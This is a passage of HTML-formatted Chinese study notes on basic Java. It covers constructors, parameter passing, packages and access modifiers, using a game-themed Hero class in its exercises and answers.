punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teemo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h4><p>参考<a href="https://how2j.cn/k/class-object/class-object-constructor/292.html#step2209">练习-构造方法</a> 设计一个构造方法,但是参数名称不太一样，分别是<br>String name<br>float hp<br>float armor<br>int moveSpeed</p><p>不仅如此，在这个构造方法中，调用这个构造方法</p><p> <code>public Hero(String name,float hp)</code></p><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Hero</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>            <span class="token comment">//带一个参数的构造方法</span>        <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"一个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token comment">//带两个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"两个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token comment">//带三个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">,</span><span class="token keyword">float</span> armor<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"三个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>armor<span class="token operator">=</span>armor<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token comment">//带四个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">,</span><span class="token keyword">float</span> armor<span class="token punctuation">,</span><span class="token keyword">int</span> moveSpeed<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>hp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"四个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        this.hp = hp;</span><span class="token comment">//        this.name=name;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>armor<span class="token operator">=</span>armor<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>moveSpeed<span class="token operator">=</span>moveSpeed<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">330</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teemo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>变量有两种类型 基本类型 和类类型</p><p>参数也是变量，所以传参分为<br><strong>基本类型传参</strong><br><strong>类类型传参</strong></p><h4 id="类类型传参"><a href="#类类型传参" class="headerlink" title="类类型传参"></a>类类型传参</h4><p>基本类型传参<br>在方法内，无法修改方法外的基本类型参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token punctuation">&#125;</span>         <span class="token comment">//回血</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">huixue</span><span class="token punctuation">(</span><span class="token keyword">int</span> xp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        hp <span class="token operator">=</span> hp <span class="token operator">+</span> xp<span class="token punctuation">;</span>        <span class="token comment">//回血完毕后，血瓶=0</span>        xp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//血瓶，其值是100</span>        <span class="token keyword">int</span> xueping <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>                 <span class="token comment">//提莫通过这个血瓶回血</span>                 teemo<span class="token punctuation">.</span><span class="token function">huixue</span><span class="token punctuation">(</span>xueping<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>xueping<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="引用与"><a href="#引用与" class="headerlink" title="引用与="></a>引用与=</h4><p>如果一个变量是基本类型<br>比如 int hp = 50;<br>我们就直接管hp叫变量<br>**=表示赋值的意思<strong>。<br>如果一个变量是类类型<br>比如 Hero h = new Hero();<br>我们就管h叫做</strong>引用<strong>。<br>**=不再是赋值的意思</strong><br>**=表示指向的意思**<br>比如 Hero h = new Hero();<br>这句话的意思是<br>引用h，指向一个Hero对象</p><h4 id="类类型传参-1"><a href="#类类型传参-1" class="headerlink" title="类类型传参"></a>类类型传参</h4><p><strong>类类型又叫引用</strong><br>第24行的引用 <strong>teemo</strong>与 第17行的引用<strong>hero</strong>，<strong>是不同的引用</strong><br>通过调用garen.attack(teemo, 100); 使得这<strong>两个引用都指向了同一个对象</strong><br>所以在第18行hero.hp = hero.hp - damage; 就使得该对象的hp值，发生了变化<br>因此第25行，打印该对象的Hp值就是变化后的值</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/595.jpg" alt="595" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">// 姓名</span>     <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">// 血量</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">// 护甲</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">// 移动速度</span>     <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">float</span> hp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// 攻击一个英雄，并让他掉damage点血</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> hero<span class="token punctuation">,</span> <span class="token keyword">int</span> damage<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        hero<span class="token punctuation">.</span>hp <span class="token operator">=</span> hero<span class="token punctuation">.</span>hp <span class="token operator">-</span> damage<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">,</span> <span class="token number">616</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>teemo<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teemo<span class="token punctuation">.</span>hp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h4><p>在方法中，使参数引用指向一个新的对象</p><p>外面的引用是指向原来的对象？还是新的对象？</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">//复活</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">revive</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">//受到400伤害，挂了</span>        teemo<span class="token punctuation">.</span>hp <span class="token operator">=</span> teemo<span class="token punctuation">.</span>hp <span class="token operator">-</span> <span class="token number">400</span><span class="token punctuation">;</span>                 teemo<span class="token punctuation">.</span><span class="token function">revive</span><span class="token punctuation">(</span>teemo<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">//问题： System.out.println(teemo.hp); 输出多少？ 怎么理解？</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h4><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包: <strong>package</strong></p><p>把比较接近的类，规划在同一个包下</p><h4 id="把比较接近的类，规划在同一个包下"><a href="#把比较接近的类，规划在同一个包下" class="headerlink" title="把比较接近的类，规划在同一个包下"></a>把比较接近的类，规划在同一个包下</h4><p>Hero,ADHero 规划在一个包，叫做charactor（角色）<br>Item,Weapon规划在另一个包下，叫做 property(道具)<br>在最开始的地方声明该类所处于的包名</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/600.png" alt="600" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token comment">//在最开始的地方声明该类所处于的包名</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用其他包下的类，必须import"><a href="#使用其他包下的类，必须import" class="headerlink" title="使用其他包下的类，必须import"></a>使用其他包下的类，必须import</h4><p>使用同一个包下的其他类，直接使用即可<br>但是要使用其他包下的类，必须import</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token comment">//Weapon类在其他包里，使用必须进行import</span><span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token comment">//装备一把武器</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-包"><a href="#练习-包" class="headerlink" title="练习-包"></a>练习-包</h4><p>创建一个新的包charactor1,并且让<a href="https://how2j.cn/k/class-object/class-object-overload/291.html#step2206">练习-治疗类</a>：Support 声明在这个包下</p><h4 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">charactor<span class="token punctuation">.</span></span><span class="token class-name">Hero</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Support</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Support</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"对自己进行治疗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Support</span> a<span class="token punctuation">,</span><span class="token class-name">Hero</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"给英雄"</span><span class="token operator">+</span>b<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加血"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Support</span> a<span class="token punctuation">,</span><span class="token class-name">Hero</span> b<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"给英雄"</span><span class="token operator">+</span>b<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加了"</span><span class="token operator">+</span>hp<span class="token operator">+</span><span class="token string">"点血"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Support</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"琴女"</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> b  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/image-20201213224645785.png" alt="image-20201213224645785" loading="lazy"></p><h3 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h3><p>成员变量有四种修饰符<br><strong>private</strong> 私有的<br><strong>package</strong>/friendly/default 不写<br><strong>protected</strong> 受保护的<br><strong>public</strong> 公共的</p><p>比如public 表示公共的</p><p><code>public String name;</code></p><p>而maxHP 没有修饰符即代表package/friendly/default</p><p><code>float maxHP</code></p><h4 id="类和类之间的关系"><a href="#类和类之间的关系" class="headerlink" title="类和类之间的关系"></a>类和类之间的关系</h4><p>类和类之间的关系有如下几种:<br>以Hero为例<br><strong>自身：</strong>指的是Hero自己<br><strong>同包子类：</strong>ADHero这个类是Hero的子类，并且和Hero处于<strong>同一个包下</strong><br><strong>不同包子类：</strong>Support这个类是Hero的子类，但是在<strong>另一个包下</strong><br><strong>同包类：</strong> GiantDragon 这个类和Hero是<strong>同一个包</strong>，但是彼此<strong>没有继承关系</strong><br><strong>其他类：</strong>Item这个类，<strong>在不同包</strong>，也没有继承关系的类</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/605.jpg" alt="605" loading="lazy"></p><h4 id="private-私有的"><a href="#private-私有的" class="headerlink" title="private 私有的"></a>private 私有的</h4><p>使用private修饰属性<br>自身：是可以访问的<br>同包子类：不能继承<br>不同包子类：不能继承<br>同包类：不能访问<br>其他包类：不能访问</p><p><strong>注：</strong> 红色字体，表示不可行</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/604.jpg" alt="604" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token comment">//属性id是private的，只有Hero自己可以访问</span>    <span class="token comment">//子类不能继承</span>    <span class="token comment">//其他类也不能访问</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="package-friendly-default-不写"><a href="#package-friendly-default-不写" class="headerlink" title="package/friendly/default 不写"></a>package/friendly/default 不写</h4><p>没有修饰符即代表package/friendly/default<br>float maxHP; 血量上限</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/609.jpg" alt="609" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token comment">// 无修饰符的属性 hp</span>    <span class="token comment">// 自己可以访问</span>     <span class="token comment">// 同包子类可以继承</span>    <span class="token comment">// 不同包子类不能继承</span>     <span class="token comment">// 同包类可以访问</span>    <span class="token comment">// 不同包类不能访问</span>    <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">// 无修饰符的属性 hp</span><span class="token 